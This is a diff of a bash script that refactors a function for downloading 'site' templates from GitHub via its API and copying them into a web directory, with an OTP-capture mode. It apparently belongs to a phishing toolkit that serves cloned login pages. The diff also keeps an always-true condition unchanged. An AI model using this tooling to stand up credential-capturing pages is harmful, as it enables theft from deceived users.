@@ -1408,12 +1408,11 @@ setup_site_dgf() {
 	if [ $plainnetstats == "online" ]; then
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                 if [ ${capture_type}="NOTP" ];then
-                        dgf ${dgfurl} otp
+                        dgf "${dgfurl}" "otp"
                 else
-                        dgf ${dgfurl} none
+                        dgf "${dgfurl}" "none"
                 fi
                 if [ -d ${site_access}/${site_id} ]; then
-                        sleep 3
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded Successfully..." 
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} SETTING UP" 
                         cp -rf ${site_access}/${site_id}/* ${www_dir}
@@ -1440,8 +1439,7 @@ dgf(){
         tokens_len=$((${#tokens[@]} - 1))
         owner=${tokens[2]}
         repo=${tokens[3]}
-        if [[ $has_branch -eq 0 ]]
-        then
+        if [[ $has_branch -eq 0 ]]; then
                 branch=${tokens[5]}
                 dir_path=${tokens[6]}
                 dir_path_start_idx="7"
@@ -1455,27 +1453,23 @@ dgf(){
         done
         # API Template "https://api.github.com/repos/${OWNER}/${REPO}/contents/${DIR_PATH}?ref=${BRANCH}"
         contents_url="https://api.github.com/repos/${owner}/${repo}/contents"
-        if [[ "${dir_path}" != "" ]]
-        then
+        if [[ "${dir_path}" != "" ]]; then
                 contents_url="${contents_url}/${dir_path}"
 
-                if [[ "${branch}" != "" ]]
-                then
+                if [[ "${branch}" != "" ]]; then
                         contents_url="${contents_url}?ref=${branch}"
                 fi
         fi
         contents_file=$(mktemp)
         accept_header="Accept: application/vnd.github.v3+json"
         auth_header="Authorization: token ${auth_token}"
-        if [ "${auth_token}" = "" ];
-        then
+        if [ "${auth_token}" = "" ]; then
                 curl -s -H "${accept_header}" "${contents_url}" > ${contents_file}
         else
                 curl -s -H "${auth_header}" -H "${accept_header}" "${contents_url}" > ${contents_file}
         fi
         rate_exceeded=$(cat ${contents_file} | grep "API rate limit exceeded" > /dev/null; echo $?)
-        if [[ "${rate_exceeded}" -eq 0 ]]
-        then
+        if [[ "${rate_exceeded}" -eq 0 ]]; then
                 echo "ERROR : API Rate limit is exceeded."
                 echo -e ""
                 exit 1
